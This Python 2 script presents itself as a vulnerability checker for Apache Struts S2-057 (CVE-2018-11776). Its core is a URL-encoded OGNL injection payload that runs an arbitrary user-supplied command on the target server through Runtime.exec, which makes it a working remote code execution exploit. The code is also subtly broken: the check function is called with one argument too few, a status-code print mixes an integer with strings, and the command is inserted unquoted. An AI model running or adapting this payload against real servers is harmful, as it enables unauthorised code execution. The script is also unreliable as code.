import requests
import optparse
import sys
import time
# Usage python struts-0daycheck.py -u http://localhost:8080 -t /struts3-showcase/ -c calc
# Prajwal's script to check for Apache Struts Zeroday s2-057, CVE-2018-11776 based on payloads provided by jas502n (github)

def zeroday_check(tgtURL, tgtPATH, tgtCMD):
	urlcheck = tgtURL+""+tgtPATH
	print "[+] Checking Vulnerability: "+urlcheck
	print "Run tcpdump on for ICMP on your IP "
	command = tgtCMD
	payload = "%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec("+command+").getInputStream()%2c%23b%3dnew%20java.io.InputStreamReader(%23a)%2c%23c%3dnew %20java.io.BufferedReader(%23b)%2c%23d%3dnew%20char%5b51020%5d%2c%23c.read(%23d)%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23sbtest.println(%23d)%2c%23sbtest.close())%7d/actionChain1.action"
	resp = requests.get(urlcheck+payload)
	time.sleep(1)
	print resp.status_code + " "+urlcheck+ " !"

def main():
	parser = optparse.OptionParser('python %prog -u <website> -t <targetpath> -c command')
	parser.add_option('-u','--url', dest = 'URLstrut',  help ='give the URL eg., http://www.exampe.com or 127.0.0.1:8080')
	parser.add_option('-t', dest = 'tgtPATH', type="string", help ='eg.,/struts3-showcase/ or /struts3-showcase/ ')
	parser.add_option('-c', dest = 'tgtCMD', type="string", help ='eg., cmd, calc, ls')
	(options,args) = parser.parse_args()
	print "[+] Struts String injection started "
	tgtURL = options.URLstrut
	tgtPATH = options.tgtPATH
	tgtCMD = options.tgtCMD
	if((tgtURL == None) | (tgtPATH == None) | (tgtCMD == None)):
		print parser.usage
		sys.exit(0)
	if(requests.get(tgtURL+""+tgtPATH).status_code==200):
		zeroday_check(tgtURL, tgtPATH)
	else:
		print "[-] Check the Target URL and Path"
	print "[+] Apache Zero Day struts scan completed"

if __name__ == "__main__":
	main()
